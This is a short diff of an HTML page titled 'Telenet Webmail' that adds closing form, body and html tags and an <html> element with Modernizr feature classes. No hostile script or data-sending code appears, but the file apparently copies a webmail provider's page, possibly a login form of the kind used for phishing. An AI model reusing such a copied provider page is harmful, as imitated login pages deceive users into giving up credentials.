@@ -1,6 +1,7 @@
 
 <!DOCTYPE html>
 
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><!--<![endif]--><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     
     <title>Telenet Webmail</title>
@@ -95,7 +96,11 @@
          </div>  <data-callback="onSubmit">
 		 
 		  </div>
+	 </form>
 
+   
+  </body>
+</html>
     
 
 
@@ -373,7 +378,7 @@
         $('input:submit').attr("disabled", true);
     });
 </script>
-a
+
 
 
     
